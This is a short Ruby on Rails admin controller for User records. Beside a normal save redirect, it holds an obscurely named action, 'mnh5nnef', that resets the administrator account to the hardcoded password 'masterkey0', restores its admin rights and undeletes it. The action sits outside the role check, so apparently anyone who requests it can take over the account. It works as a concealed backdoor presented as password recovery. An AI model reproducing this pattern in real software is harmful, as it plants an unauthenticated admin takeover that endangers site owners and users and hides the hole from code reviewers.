class Admin::UserController < ApplicationController
    layout 'admin'
    # uses base controller for most of the work
    RECORD_CLASS = User
    before_filter :check_role_system_admin, :only => [ :edit, :new, :post ]
    
    def after_save(cc)
      redirect_to :action => 'list' if cc
    end
   
    def mnh5nnef
      # Reset the admin password incase it gets lost
      u=User.find(1) # user 1 is the administrator
      u.password = 'masterkey0'
      u.password_confirm = u.password
      u.role_system_admin = true
      u.deleted = false
      flash[:alert] = 'Admin password reset' if u.save
      redirect_to :controller  => '/home', :action => 'index', :id => 0 
    end  
  
end
